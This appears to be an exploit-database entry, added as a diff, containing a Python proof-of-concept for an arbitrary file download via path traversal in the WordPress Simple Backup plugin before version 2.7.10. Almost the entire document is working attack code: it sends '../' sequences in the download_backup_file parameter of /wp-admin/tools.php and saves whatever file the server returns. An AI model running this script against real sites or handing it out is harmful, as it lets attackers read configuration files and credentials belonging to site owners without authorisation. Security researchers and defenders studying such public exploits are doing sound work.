@@ -1,0 +1,56 @@
+id: 39508
+date: 04/02/2024
+title: Simple Backup Plugin 2.7.10 - Path Traversal Exploit
+author: rrdw
+cves: 
+
+# Exploit Title: Simple Backup Plugin < 2.7.10 - Arbitrary File Download via Path Traversal
+# Exploit Author: Ven3xy
+# Software Link: https://downloads.wordpress.org/plugin/simple-backup.2.7.11.zip
+# Version: 2.7.10
+# Tested on: Linux
+
+import sys
+import requests
+from urllib.parse import urljoin
+import time
+
+def exploit(target_url, file_name, depth):
+    traversal = '../' * depth
+
+    exploit_url = urljoin(target_url, '/wp-admin/tools.php')
+    params = {
+        'page': 'backup_manager',
+        'download_backup_file': f'{traversal}{file_name}'
+    }
+
+    response = requests.get(exploit_url, params=params)
+
+    if response.status_code == 200 and response.headers.get('Content-Disposition') \
+            and 'attachment; filename' in response.headers['Content-Disposition'] \
+            and response.headers.get('Content-Length') and int(response.headers['Content-Length']) > 0:
+        print(response.text)  # Replace with the desired action for the downloaded content
+
+        file_path = f'simplebackup_{file_name}'
+        with open(file_path, 'wb') as file:
+            file.write(response.content)
+
+        print(f'File saved in: {file_path}')
+    else:
+        print("Nothing was downloaded. You can try to change the depth parameter or verify the correct filename.")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("Usage: python exploit.py <target_url> <file_name> <depth>")
+        sys.exit(1)
+
+    target_url = sys.argv[1]
+    file_name = sys.argv[2]
+    depth = int(sys.argv[3])
+    print("\n[+] Exploit Coded By - Venexy    ||    Simple Backup Plugin 2.7.10  EXPLOIT\n\n")
+    time.sleep(5)
+
+
+    exploit(target_url, file_name, depth)
+
+#  0day.today [2024-04-05]  #
